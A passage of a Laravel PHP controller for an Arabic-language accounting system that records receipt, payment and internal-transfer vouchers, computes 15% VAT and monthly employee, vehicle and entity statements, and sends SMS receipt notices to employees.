    //                     $total_qabd += $amount;
    //                     $tax_qabd += $taxAmount;
    //                 } else {
    //                     $total_internal_transfer += $amount;
    //                     $tax_internal_transfer += $taxAmount;
    //                 }
    //             }

    //             $statement[] = [
    //                 'id' => $snd->id,
    //                 'type' => $snd->type,
    //                 'amount' => $amount,
    //                 'client_type' => $snd->client_type,
    //                 'description' => $snd->description,
    //                 'date' => $snd->date,
    //                 'tax' => $taxLabel,
    //                 'tax_amount' => $taxAmount,
    //                 'total_amount' => $totalAmount,
    //             ];
    //         }

    //         $total_tax = $tax_qabd + $tax_sarf + $tax_internal_transfer;
    //         $remaining = $total_qabd - ($total_sarf + $total_internal_transfer);
    //     }

    //     // إنشاء ملخص شهري
    //     $monthlyStatements = [];

    //     foreach ($snds as $snd) {
    //         $monthKey = \Carbon\Carbon::parse($snd->date)->format('Y-m');
    //         $monthLabel = \Carbon\Carbon::parse($snd->date)->translatedFormat('F Y');

    //         $amount = floatval($snd->amount);
    //         $taxLabel = $snd->tax;
    //         $taxAmount = 0;
    //         $totalAmount = $amount;

    //         if ($taxLabel === 'شامل الضريبة') {
    //             $baseAmount = $amount / 1.15;
    //             $taxAmount = $amount - $baseAmount;
    //         } elseif ($taxLabel === 'غير شامل الضريبة') {
    //             $taxAmount = $amount * 0.15;
    //             $totalAmount = $amount + $taxAmount;
    //         }

    //         $type = $snd->type;

    //         if (!isset($monthlyStatements[$monthKey])) {
    //             $monthlyStatements[$monthKey] = [
    //                 'label' => $monthLabel,
    //                 'snds' => [],
    //                 'count' => 0,
    //                 'total_qabd' => 0,
    //                 'total_sarf' => 0,
    //                 'total_internal_transfer' => 0,
    //             ];
    //         }

    //         $monthlyStatements[$monthKey]['snds'][] = [
    //             'id' => $snd->id,
    //             'type' => $type,
    //             'amount' => $amount,
    //             'client_type' => $snd->client_type,
    //             'description' => $snd->description,
    //             'date' => $snd->date,
    //             'tax' => $taxLabel,
    //             'tax_amount' => $taxAmount,
    //             'total_amount' => $totalAmount,
    //         ];

    //         $monthlyStatements[$monthKey]['count']++;

    //         if ($type === 'قبض') {
    //             $monthlyStatements[$monthKey]['total_qabd'] += $amount;
    //         } elseif ($type === 'صرف') {
    //             $monthlyStatements[$monthKey]['total_sarf'] += $amount;
    //         } elseif ($snd->type === 'تحويل داخلي') {
    //             $isSameClient = false;

    //             if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
    //                 $isSameClient = true;
    //             } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
    //                 $isSameClient = true;
    //             } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
    //                 $isSameClient = true;
    //             }

    //             if ($isSameClient) {
    //                 $monthlyStatements[$monthKey]['total_qabd'] += $amount;
    //             } else {
    //                 $monthlyStatements[$monthKey]['total_internal_transfer'] += $amount;
    //             }
    //         }

    //     }

    //     return view('/admin/box/account', compact(
    //         'filter_type',
    //         'item_id',
    //         'selectedItem',
    //         'employees',
    //         'vehicles',
    //         'gehas',
    //         'items',
    //         'statement',
    //         'total_qabd',
    //         'total_sarf',
    //         'total_internal_transfer',
    //         'remaining',
    //         'tax_qabd',
    //         'tax_sarf',
    //         'tax_internal_transfer',
    //         'total_tax',
    //         'month',
    //         'year',
    //         'monthlyStatements'
    //     ));
    // }
    public function employeeStatementPage(Request $request)
    {
        $filter_type = $request->filter_type;
        $item_id = $request->item_id;
        $month = $request->month;
        $year = $request->year;
        $employees = Employee::whereNull('archive')->get();
        $vehicles = Car::whereNull('archive')->get();
        $gehas = Geha::all();

        $items = [];
        $selectedItem = null;
        $statement = [];
        $snds = collect();

        $total_qabd = 0;
        $total_sarf = 0;
        $total_internal_transfer = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;
        $tax_internal_transfer = 0;
        $total_tax = 0;
        $remaining = 0;
        $vehicle_due = 0;
        $other_due = 0;

        if ($filter_type) {
            if ($filter_type == 'employee') {
                $items = $employees;
            } elseif ($filter_type == 'vehicle') {
                $items = $vehicles;
            } elseif ($filter_type == 'geha') {
                $items = $gehas;
            }
        }

        if ($filter_type && ($item_id || ($month && $year))) {
            $query = Snd::query();

            if ($item_id) {
                if ($filter_type == 'employee') {
                    $query->where('employee_id', $item_id);
                    $selectedItem = Employee::find($item_id);
                } elseif ($filter_type == 'vehicle') {
                    $query->where('client_type', 'سيارة')->where('car_id', $item_id);
                    $selectedItem = Car::find($item_id);
                } elseif ($filter_type == 'geha') {
                    $query->where(function ($q) use ($item_id) {
                        $q->where(function ($sub) use ($item_id) {
                            $sub->where('client_type', 'جهة')
                                ->where('geha_id', $item_id);
                        })->orWhere(function ($sub) use ($item_id) {
                            $sub->where('type', 'تحويل داخلي')
                                ->where('client_type', '!=', 'جهة')
                                ->where('geha_id', $item_id);
                        });
                    });
                    $selectedItem = Geha::find($item_id);
                }
            } else {
                if ($filter_type == 'employee') {
                    $query->whereNotNull('employee_id');
                } elseif ($filter_type == 'vehicle') {
                    $query->where('client_type', 'سيارة');
                } elseif ($filter_type == 'geha') {
                    $query->where(function ($q) {
                        $q->where('client_type', 'جهة')->orWhere('type', 'تحويل داخلي');
                    });
                }
            }

            if ($month && $year) {
                $query->whereMonth('date', $month)->whereYear('date', $year);
            }

            $snds = $query->get();

            foreach ($snds as $snd) {
                $amount = floatval($snd->amount);
                $taxLabel = $snd->tax;
                $taxAmount = 0;
                $totalAmount = $amount;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                }

                if ($snd->type === 'قبض') {
                    $total_qabd += $amount;
                    $tax_qabd += $taxAmount;
                } elseif ($snd->type === 'صرف') {
                    $total_sarf += $amount;
                    $tax_sarf += $taxAmount;
                } elseif ($snd->type === 'تحويل داخلي') {
                    $isSameClient = false;

                    if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
                        $isSameClient = true;
                    } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
                        $isSameClient = true;
                    } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
                        $isSameClient = true;
                    }

                    if ($isSameClient) {
                        $total_qabd += $amount;
                        $tax_qabd += $taxAmount;
                    } else {
                        $total_internal_transfer += $amount;
                        $tax_internal_transfer += $taxAmount;

                        if ($filter_type === 'employee' && $snd->client_type === 'سيارة') {
                            $vehicle_due += $amount;
                        } else {
                            $other_due += $amount;
                        }
                    }
                }

                $statement[] = [
                    'id' => $snd->id,
                    'type' => $snd->type,
                    'amount' => $amount,
                    'client_type' => $snd->client_type,
                    'description' => $snd->description,
                    'date' => $snd->date,
                    'tax' => $taxLabel,
                    'tax_amount' => $taxAmount,
                    'total_amount' => $totalAmount,
                ];
            }

            $total_tax = $tax_qabd + $tax_sarf + $tax_internal_transfer;

            if ($filter_type === 'employee') {
                $remaining = $total_qabd - ($total_sarf + $vehicle_due + $other_due);
            } else {
                $other_due = $total_internal_transfer;
                $remaining = $total_qabd - ($total_sarf + $other_due);
            }
        }

        $monthlyStatements = [];

        foreach ($snds as $snd) {
            $monthKey = \Carbon\Carbon::parse($snd->date)->format('Y-m');
            $monthLabel = \Carbon\Carbon::parse($snd->date)->translatedFormat('F Y');

            $amount = floatval($snd->amount);
            $taxLabel = $snd->tax;
            $taxAmount = 0;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
            }

            $type = $snd->type;

            if (!isset($monthlyStatements[$monthKey])) {
                $monthlyStatements[$monthKey] = [
                    'label' => $monthLabel,
                    'snds' => [],
                    'count' => 0,
                    'total_qabd' => 0,
                    'total_sarf' => 0,
                    'total_internal_transfer' => 0,
                    'vehicle_due' => 0,
                    'other_due' => 0,
                    'remaining' => 0,
                ];
            }

            $monthlyStatements[$monthKey]['snds'][] = $snd;
            $monthlyStatements[$monthKey]['count']++;

            if ($type === 'قبض') {
                $monthlyStatements[$monthKey]['total_qabd'] += $amount;
            } elseif ($type === 'صرف') {
                $monthlyStatements[$monthKey]['total_sarf'] += $amount;
            } elseif ($type === 'تحويل داخلي') {
                $isSameClient = false;

                if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
                    $isSameClient = true;
                } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
                    $isSameClient = true;
                } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
                    $isSameClient = true;
                }

                if ($isSameClient) {
                    $monthlyStatements[$monthKey]['total_qabd'] += $amount;
                } else {
                    $monthlyStatements[$monthKey]['total_internal_transfer'] += $amount;

                    if ($filter_type === 'employee' && $snd->client_type === 'سيارة') {
                        $monthlyStatements[$monthKey]['vehicle_due'] += $amount;
                    } else {
                        $monthlyStatements[$monthKey]['other_due'] += $amount;
                    }
                }
            }

            if ($filter_type === 'employee') {
                $monthlyStatements[$monthKey]['remaining'] =
                    $monthlyStatements[$monthKey]['total_qabd']
                    - (
                        $monthlyStatements[$monthKey]['total_sarf']
                        + $monthlyStatements[$monthKey]['vehicle_due']
                        + $monthlyStatements[$monthKey]['other_due']
                    );
            } else {
                $monthlyStatements[$monthKey]['other_due'] =
                    $monthlyStatements[$monthKey]['total_internal_transfer'];
                $monthlyStatements[$monthKey]['remaining'] =
                    $monthlyStatements[$monthKey]['total_qabd']
                    - (
                        $monthlyStatements[$monthKey]['total_sarf']
                        + $monthlyStatements[$monthKey]['other_due']
                    );
            }
        }

        return view('/admin/box/account', compact(
            'filter_type',
            'item_id',
            'selectedItem',
            'employees',
            'vehicles',
            'gehas',
            'items',
            'statement',
            'total_qabd',
            'total_sarf',
            'total_internal_transfer',
            'vehicle_due',
            'other_due',
            'remaining',
            'tax_qabd',
            'tax_sarf',
            'tax_internal_transfer',
            'total_tax',
            'month',
            'year',
            'monthlyStatements'
        ));
    }




    public function update(Request $request, $id)
    {
        $snd = Snd::findOrFail($id);
        $snd->description = $request->description;
        $snd->date = $request->date;
        $snd->save();

        return back()->with('success', 'تم تحديث السند بنجاح');
    }



    ///////////////////////////



    //     public function storeSnd(Request $request)
    // {
    //     $request->validate([
    //         'type' => 'required',
    //         'client_type' => 'nullable|in:سيارة,موظف',
    //         'client_id' => 'nullable|exists:'.($request->client_type == 'سيارة' ? 'cars' : 'employees').',id',
    //         'payment_method' => 'nullable|string',
    //         'amount' => 'nullable|numeric',
    //         'tax' => 'nullable|string',
    //         'description' => 'nullable|string',
    //         'date' => 'nullable|date',
    //     ]);

    //     $snd = new Snd();
    //     $snd->type = $request->type;
    //     $snd->client_type = $request->client_type;

    //     if ($request->client_type == 'سيارة') {
    //         $snd->car_id = $request->client_id;
    //         $snd->employee_id = null;
    //     } elseif ($request->client_type == 'موظف') {
    //         $snd->employee_id = $request->client_id;
    //         $snd->car_id = null;
    //     }

    //     $snd->payment_method = $request->payment_method;
    //     $snd->amount = $request->amount;
    //     $snd->tax = $request->tax;
    //     $snd->description = $request->description;
    //     $snd->date = $request->date;

    //     $snd->save();

    //     return redirect()->back()->with('success', 'تم إضافة السند بنجاح');
    // }


    // public function storeSnd(Request $request)
    // {
    //     $request->validate([
    //         'type' => 'required',
    //         'from_type' => 'nullable|in:سيارة,موظف',
    //         'from_id' => 'nullable|integer',
    //         'to_type' => 'nullable|in:سيارة,موظف',
    //         'to_id' => 'nullable|integer',
    //         'client_type' => 'nullable|in:سيارة,موظف',
    //         'client_id' => 'nullable|integer',
    //         'payment_method' => 'nullable|string',
    //         'amount' => 'nullable|numeric',
    //         'tax' => 'nullable|string',
    //         'description' => 'nullable|string',
    //         'date' => 'nullable|date',
    //     ]);

    //     $snd = new Snd();
    //     $snd->type = $request->type;
    //     $snd->payment_method = $request->payment_method;
    //     $snd->amount = $request->amount;
    //     $snd->tax = $request->tax;
    //     $snd->description = $request->description;
    //     $snd->date = $request->date;

    //     if ($request->type == 'تحويل داخلي') {
    //         // الطرف المستلم فقط
    //         if ($request->to_type == 'موظف') {
    //             $snd->client_type = 'موظف';
    //             $snd->employee_id = $request->to_id;
    //             $snd->car_id = $request->from_id;
    //         } elseif ($request->to_type == 'سيارة') {
    //             $snd->client_type = 'سيارة';
    //             $snd->car_id = $request->to_id;
    //             $snd->employee_id =  $request->from_id;
    //         }
    //     } else {
    //         // سند عادي
    //         $snd->client_type = $request->client_type;

    //         if ($request->client_type == 'سيارة') {
    //             $snd->car_id = $request->client_id;
    //             $snd->employee_id = null;
    //         } elseif ($request->client_type == 'موظف') {
    //             $snd->employee_id = $request->client_id;
    //             $snd->car_id = null;
    //         }
    //     }

    //     $snd->save();

    //     return redirect()->back()->with('success', 'تم إضافة السند بنجاح');
    // }
    // public function storeSnd(Request $request)
    // {
    //     $request->validate([
    //         'type' => 'required',
    //         'from_type' => 'nullable|in:سيارة,موظف,جهة',
    //         'from_id' => 'nullable|integer',
    //         'to_type' => 'nullable|in:سيارة,موظف,جهة',
    //         'to_id' => 'nullable|integer',
    //         'client_type' => 'nullable|in:سيارة,موظف,جهة',
    //         'client_id' => 'nullable|integer',
    //         'payment_method' => 'nullable|string',
    //         'amount' => 'nullable|numeric',
    //         'tax' => 'nullable|string',
    //         'description' => 'nullable|string',
    //         'date' => 'nullable|date',
    //     ]);

    //     $snd = new Snd();
    //     $snd->type = $request->type;
    //     $snd->payment_method = $request->payment_method;
    //     $snd->amount = $request->amount;
    //     $snd->tax = $request->tax;
    //     $snd->description = $request->description;
    //     $snd->date = $request->date;

    //     if ($request->type == 'تحويل داخلي') {
    //         if ($request->to_type == 'موظف') {
    //             $snd->client_type = 'موظف';
    //             $snd->employee_id = $request->to_id;
    //             $snd->car_id = $request->from_id;
    //             $snd->geha_id = null;
    //         } elseif ($request->to_type == 'سيارة') {
    //             $snd->client_type = 'سيارة';
    //             $snd->car_id = $request->to_id;
    //             $snd->employee_id = $request->from_id;
    //             $snd->geha_id = null;
    //         } elseif ($request->to_type == 'جهة') {
    //             $snd->client_type = 'جهة';
    //             $snd->geha_id = $request->to_id;
    //             $snd->car_id = $request->from_id;
    //             $snd->employee_id = null;
    //         }
    //     } else {
    //         $snd->client_type = $request->client_type;

    //         if ($request->client_type == 'سيارة') {
    //             $snd->car_id = $request->client_id;
    //             $snd->employee_id = null;
    //             $snd->geha_id = null;
    //         } elseif ($request->client_type == 'موظف') {
    //             $snd->employee_id = $request->client_id;
    //             $snd->car_id = null;
    //             $snd->geha_id = null;
    //         } elseif ($request->client_type == 'جهة') {
    //             $snd->geha_id = $request->client_id;
    //             $snd->car_id = null;
    //             $snd->employee_id = null;
    //         }
    //     }

    //     $snd->save();

    //     return redirect()->back()->with('success', 'تم إضافة السند بنجاح');
    // }


    // public function storeSnd(Request $request)
    // {
    //     $request->validate([
    //         'type' => 'required',
    //         'from_type' => 'nullable|in:سيارة,موظف,جهة',
    //         'from_id' => 'nullable|integer',
    //         'to_type' => 'nullable|in:سيارة,موظف,جهة',
    //         'to_id' => 'nullable|integer',
    //         'payment_method' => 'nullable|string',
    //         'amount' => 'nullable|numeric',
    //         'tax' => 'nullable|string',
    //         'description' => 'nullable|string',
    //         'date' => 'nullable|date',
    //     ]);

    //     $snd = new Snd();
    //     $snd->type = $request->type;
    //     $snd->payment_method = $request->payment_method;
    //     $snd->amount = $request->amount;
    //     $snd->tax = $request->tax;
    //     $snd->description = $request->description;
    //     $snd->date = $request->date;

    //     // تحديد الحسابات بناءً على نوع التحويل
    //     if ($request->type == 'تحويل داخلي') {
    //         $snd->client_type = $request->to_type;

    //         // تحديد بيانات "إلى"
    //         if ($request->to_type == 'سيارة') {
    //             $snd->car_id = $request->to_id;
    //         } elseif ($request->to_type == 'موظف') {
    //             $snd->employee_id = $request->to_id;
    //         } elseif ($request->to_type == 'جهة') {
    //             $snd->geha_id = $request->to_id;
    //         }

    //         // تحديد بيانات "من"
    //         if ($request->from_type == 'سيارة') {
    //             $snd->car_id = $request->from_id;
    //         } elseif ($request->from_type == 'موظف') {
    //             $snd->employee_id = $request->from_id;
    //         } elseif ($request->from_type == 'جهة') {
    //             $snd->geha_id = $request->from_id;
    //         }

    //     } else {
    //         $snd->client_type = $request->client_type;

    //         // تحديد بيانات "إلى"
    //         if ($request->client_type == 'سيارة') {
    //             $snd->car_id = $request->client_id;
    //         } elseif ($request->client_type == 'موظف') {
    //             $snd->employee_id = $request->client_id;
    //         } elseif ($request->client_type == 'جهة') {
    //             $snd->geha_id = $request->client_id;
    //         }
    //     }

    //     $snd->save();

    //     return redirect()->back()->with('success', 'تم إضافة السند بنجاح');
    // }



    public function storeSnd(Request $request)
    {

        if (
            $request->type === 'قبض' &&
            $request->client_type === 'موظف' &&
            $request->payment_method === 'كاش'
        ) {
            $employee = Employee::find($request->client_id);

            if (!$employee || !$employee->phone) {
                return redirect()->back()->withErrors(['msg' => 'لا يمكن إنشاء سند قبض للموظف بدون رقم هاتف.']);
            }
        }

        // القواعد
        $rules = [
            'type' => 'required|in:صرف,قبض,تحويل داخلي',
            'payment_method' => 'nullable|string',
            'amount' => 'required|numeric',
            'tax' => 'nullable|string',
            'description' => 'nullable|string',
            'date' => 'required|date',
        ];

        if ($request->type == 'تحويل داخلي') {
            $rules = array_merge($rules, [
                'from_type' => 'required|in:سيارة,موظف,جهة',
                'from_id' => 'required|integer',
                'to_type' => 'required|in:سيارة,موظف,جهة',
                'to_id' => 'required|integer',
            ]);
        } else {
            $rules = array_merge($rules, [
                'client_type' => 'required|in:سيارة,موظف,جهة',
                'client_id' => 'required|integer',
            ]);
        }

        // رسائل التحقق بالعربي
        $messages = [
            'type.required' => 'نوع السند مطلوب.',
            'type.in' => 'نوع السند غير صحيح.',
            'amount.required' => 'قيمة السند مطلوبة.',
            'amount.numeric' => 'قيمة السند يجب أن تكون رقم.',
            'date.required' => 'تاريخ السند مطلوب.',
            'date.date' => 'تاريخ غير صالح.',

            'from_type.required' => 'نوع الحساب المحول منه مطلوب.',
            'from_type.in' => 'نوع الحساب المحول منه غير صالح.',
            'from_id.required' => ' الحساب المحول منه مطلوب.',
            'from_id.integer' => ' الحساب المحول منه غير صحيح.',

            'to_type.required' => 'نوع الحساب المحول إليه مطلوب.',
            'to_type.in' => 'نوع الحساب المحول إليه غير صالح.',
            'to_id.required' => ' الحساب المحول إليه مطلوب.',
            'to_id.integer' => ' الحساب المحول إليه غير صحيح.',

            'client_type.required' => 'نوع العميل مطلوب.',
            'client_type.in' => 'نوع العميل غير صالح.',
            'client_id.required' => ' العميل مطلوب.',
            'client_id.integer' => ' العميل غير صحيح.',
        ];

        $request->validate($rules, $messages);

        // إنشاء السند
        $snd = new Snd();
        $snd->type = $request->type;
        $snd->payment_method = $request->payment_method;
        $snd->bank_account = $request->bank_account;

        $snd->amount = $request->amount;
        $snd->tax = $request->tax;
        $snd->description = $request->description;
        $snd->date = $request->date;

        if ($request->type == 'تحويل داخلي') {
            $snd->client_type = $request->to_type;

            if ($request->from_type == 'سيارة') {
                $snd->car_id = $request->from_id;
            } elseif ($request->from_type == 'موظف') {
                $snd->employee_id = $request->from_id;
            } elseif ($request->from_type == 'جهة') {
                $snd->geha_id = $request->from_id;
            }

            if ($request->to_type == 'سيارة') {
                $snd->car_id = $request->to_id;
            } elseif ($request->to_type == 'موظف') {
                $snd->employee_id = $request->to_id;
            } elseif ($request->to_type == 'جهة') {
                $snd->geha_id = $request->to_id;
            }
        } else {
            $snd->client_type = $request->client_type;

            if ($request->client_type == 'سيارة') {
                $snd->car_id = $request->client_id;
            } elseif ($request->client_type == 'موظف') {
                $snd->employee_id = $request->client_id;
            } elseif ($request->client_type == 'جهة') {
                $snd->geha_id = $request->client_id;
            }
        }

        $snd->save();


        // تحقق من شرط السند: تحويل داخلي من جهة "بنك الرياض (تجميع نقاط البيع)" إلى موظف
        if (
            $snd->type === 'تحويل داخلي' &&
            $request->from_type === 'جهة' &&
            optional(Geha::find($request->from_id))->name === 'بنك الرياض ( تجميع نقاط البيع )' &&
            $request->to_type === 'موظف'
        ) {
            $taxGeha = Geha::where('name', 'ضريبة القيمه المضافه')->first();

            if ($taxGeha) {
                $taxSnd = new Snd();
                $taxSnd->type = 'تحويل داخلي';
                $taxSnd->payment_method = $request->payment_method;
                $taxSnd->bank_account = $request->bank_account;
                $taxSnd->amount = $request->amount * 0.15;
                $taxSnd->tax = $request->tax;
                $taxSnd->description = $request->description;
                $taxSnd->date = $request->date;

                $taxSnd->client_type = 'جهة'; // المستقبل هو ضريبة القيمة المضافة

                // من الموظف (نفس الذي تم التحويل إليه)
                $taxSnd->employee_id = $request->to_id;

                // إلى الجهة "ضريبة القيمة المضافة"
                $taxSnd->geha_id = $taxGeha->id;

                $taxSnd->save();
            } else {
                Log::warning('جهة "ضريبة القيمة المضافة" غير موجودة');
            }
        }


        if (
            $snd->type === 'قبض' &&
            $snd->client_type === 'موظف' &&
            $snd->payment_method === 'كاش'
        ) {
            $employee = Employee::find($snd->employee_id);


            if ($employee && $employee->phone) {


                //
                $total_debit = $employee->snd
                    ->filter(function ($q) {
                        return $q->type === 'صرف' ||
                            ($q->type === 'تحويل داخلي' && in_array($q->client_type, ['سيارة', 'جهة']));
                    })->sum('amount');

                $total_credit = $employee->snd
                    ->filter(function ($q) {
                        return $q->type === 'قبض' ||
                            ($q->type === 'تحويل داخلي' && $q->client_type === 'موظف');
                    })->sum('amount');

                $balance = $total_credit - $total_debit;

                $firstName = explode(' ', $employee->name)[0];
                $amount = number_format($snd->amount, 2);
                $date = \Carbon\Carbon::parse($snd->date)->format('Y-m-d');

                $body = "عزيزي المستفيد {$firstName}،\n"
                    . "تم استلام مبلغ {$amount} بتاريخ {$date}.\n"
                    . "رقم السند: {$snd->id}";

                if ($balance < 0) {
                    $balanceFormatted = number_format($balance, 2);
                    $body .= "\nرصيدك الحالي : {$balanceFormatted}";
                    $body .= "\nملاحظة: في حال وجود أي ملاحظة على الرصيد، نرجو التواصل على الرقم 0509040954، علمًا بأن الرصيد الحالي قابل للزيادة أو النقص.";
                }


                //

                // حفظ الرسالة في قاعدة البيانات
                $message = Message::create([
                    'employee_id' => $employee->id,
                    'message' => $body,
                ]);

                try {
                    $response = Http::withHeaders([
                        'Authorization' => 'Bearer ' . config('services.taqnyat.bearer_token'),
                        'Content-Type' => 'application/json',
                    ])->post(config('services.taqnyat.url'), [
                        'sender' => config('services.taqnyat.sender'),
                        'recipients' => [$employee->phone, '0509040954'],
                        'body' => $body,
                    ]);

                    if (!$response->successful()) {
                        Log::error('فشل إرسال الرسالة عبر Taqnyat', ['response' => $response->body()]);
                    }
                } catch (\Exception $e) {
                    Log::error('خطأ أثناء إرسال SMS', ['message' => $e->getMessage()]);
                }
            }
        }


        return redirect()->back()->with('success', 'تم إضافة السند بنجاح');
    }


    public function latePayments(Request $request)
    {
        $month = $request->input('month');
        $year = $request->input('year');

        $employees = Employee::with(['snd' => function ($q) use ($month, $year) {
            if ($month && $year) {
                $q->whereMonth('date', $month)->whereYear('date', $year);
            }
        }])->get()->filter(function ($employee) {
            $total_debit = $employee->snd
                ->filter(function ($q) {
                    return $q->type === 'صرف' ||
                        ($q->type === 'تحويل داخلي' && in_array($q->client_type, ['سيارة', 'جهة']));
                })->sum('amount');

            $total_credit = $employee->snd
                ->filter(function ($q) {
                    return $q->type === 'قبض' ||
                        ($q->type === 'تحويل داخلي' && $q->client_type === 'موظف');
                })->sum('amount');

            $balance = $total_credit - $total_debit;

            return $balance < 0;
        })->values();

        return view('/admin/box/late', compact('employees'));
    }



    // public function latePayments()
    // {
    //     $employees = Employee::with('snd')
    //         ->get()
    //         ->filter(function ($employee) {
    //             $total_debit = $employee->snd()
    //                 ->where(function ($q) {
    //                     $q->where('type', 'صرف')
    //                         ->orWhere(function ($q2) {
    //                             $q2->where('type', 'تحويل داخلي')
    //                                 ->where('client_type', 'سيارة')
    //                                 ->orwhere('client_type', 'جهة');
    //                         });
    //                 })->sum('amount');

    //             $total_credit = $employee->snd()
    //                 ->where('type', 'قبض')
    //                 ->sum('amount');

    //             $balance = $total_credit - $total_debit;

    //             return $balance < -3000;
    //         })
    //         ->values(); // لإعادة ترتيب الـ collection

    //     return view('/admin/box/late', compact('employees'));
    // }




    // 
    public function printSnd(Request $request)
    {
        $snd = Snd::with('employee', 'car')->findOrFail($request->snd_id);

        // حساب الضريبة
        $baseAmount = floatval($snd->amount);
        $taxLabel = $snd->tax;
        $taxValue = 0;
        $total = $baseAmount;

        if ($taxLabel === 'شامل الضريبة') {
            $baseAmount = $baseAmount / 1.15;
            $taxValue = $snd->amount - $baseAmount;
            $total = $snd->amount;
        } elseif ($taxLabel === 'غير شامل الضريبة') {
            $taxValue = $baseAmount * 0.15;
            $total = $baseAmount + $taxValue;
        }

        return view('admin.box.print', compact('snd', 'baseAmount', 'taxValue', 'total'));
    }

    public function getPointAndBank(request $request)
    {
        $query = Snd::whereIn('payment_method', ['تحويل بنكي', 'نقاط بيع']);
        if ($request->filled('from_date') && $request->filled('to_date')) {
            $query->whereBetween('date', [$request->from_date, $request->to_date]);
        }

        if ($request->filled('bank_account')) {
            $query->where('bank_account', $request->bank_account);
        }

        $snds = $query->get();
        $cars = Car::whereNull('archive')->get();
        $gehas = Geha::get();

        $Employees = Employee::whereNull('archive')->get();

        // المتغيرات المطلوبة
        $total_base_qabd = 0;
        $total_base_sarf = 0;
        $total_qabd = 0;
        $total_sarf = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;

        foreach ($snds as $snd) {
            $amount = floatval($snd->amount);
            $baseAmount = $amount;
            $taxAmount = 0;
            $taxLabel = $snd->tax;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
                $totalAmount = $amount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
                $totalAmount = $amount + $taxAmount;
            } else { // غير خاضع للضريبة
                $totalAmount = $amount;
                $taxAmount = 0;
            }

            if ($snd->type == 'قبض') {
                $total_base_qabd += $baseAmount;
                $total_qabd += $totalAmount;
                $tax_qabd += $taxAmount;
            } elseif ($snd->type == 'صرف') {
                $total_base_sarf += $baseAmount;
                $total_sarf += $totalAmount;
                $tax_sarf += $taxAmount;
            }
        }

        //
        $grouped = $snds->groupBy(function ($item) {
            return \Carbon\Carbon::parse($item->date)->format('m-Y');
        });

        $report = [];

        foreach ($grouped as $monthYear => $monthSnds) {
            $count = $monthSnds->count();

            $qabd = 0;
            $sarf = 0;
            $internal = 0;

            foreach ($monthSnds as $snd) {
                $amount = floatval($snd->amount);
                $baseAmount = $amount;
                $taxAmount = 0;
                $taxLabel = $snd->tax;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                    $totalAmount = $amount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                } else {
                    $totalAmount = $amount;
                    $taxAmount = 0;
                }

                if ($snd->type == 'قبض') {
                    $qabd += $totalAmount;
                } elseif ($snd->type == 'صرف') {
                    $sarf += $totalAmount;
                } elseif ($snd->type == 'تحويل داخلي') {
                    $internal += $totalAmount;
                }
            }

            $balance = $qabd - $sarf;

            $report[] = [
                'month' => $monthYear,
                'count' => $count,
                'qabd' => $qabd,
                'sarf' => $sarf,
                'internal' => $internal,
                'balance' => $balance,
            ];
        }

        // return view('admin.box.monthly_report', compact('report'));

        //

        return view('/admin/box/pointsAndBank', compact(
            'snds',
            'cars',
            'Employees',
            'gehas',
            'total_base_qabd',
            'total_base_sarf',
            'total_qabd',
            'total_sarf',
            'tax_qabd',
            'tax_sarf',
            'report'
        ));
    }
    public function sndsByMonthPoint($month)
    {
        $month = trim($month);
        $bankAccount = request('bank_account'); // جلب البنك المختار من الريكوست

        $query = Snd::whereIn('payment_method', ['تحويل بنكي', 'نقاط بيع'])
            ->where('date', 'like', "$month%");

        if ($bankAccount) {
            $query->where('bank_account', $bankAccount);
        }

        $snds = $query->get();

        return view('admin.box.sndDataPointAndBank', compact('snds', 'month', 'bankAccount'));
    }



    public function updateBankAccount(Request $request)
    {
        $request->validate([
            'snd_id' => 'required',
            'bank_account' => 'required|string|max:255',
        ]);

        $snd = Snd::findOrFail($request->snd_id);
        $snd->bank_account = $request->bank_account;
        $snd->save();

        return back()->with('success', 'تم تحديث الحساب البنكي بنجاح.');
    }

    //     public function printStatements(Request $request)
    // {
    //     $employee = Employee::findOrFail($request->employee_id);
    //     $month = $request->month;

    //     $transactions = snd::where('employee_id', $employee->id)
    //         ->whereMonth('date', Carbon::parse($month)->month)
    //         ->whereYear('date', Carbon::parse($month)->year)
    //         ->whereIn('type', ['قبض', 'صرف'])
    //         ->get();

    //     $totalQabd = $transactions->where('type', 'قبض')->sum('amount');

    //     return view('admin.box.printState', [
    //         'employee' => $employee,
    //         'month' => $month,
    //         'transactions' => $transactions,
    //         'totalQabd' => $totalQabd,
    //     ]);
    // }
    // public function printStatements(Request $request)
    // {
    //     $employee = Employee::findOrFail($request->employee_id);
    //     $month = $request->month;

    //     $monthParsed = Carbon::parse($month);

    //     $transactions = Snd::whereMonth('date', $monthParsed->month)
    //         ->whereYear('date', $monthParsed->year)
    //         ->where(function ($q) use ($employee) {
    //             $q->where('employee_id', $employee->id)
    //                 ->whereIn('type', ['قبض', 'صرف']);
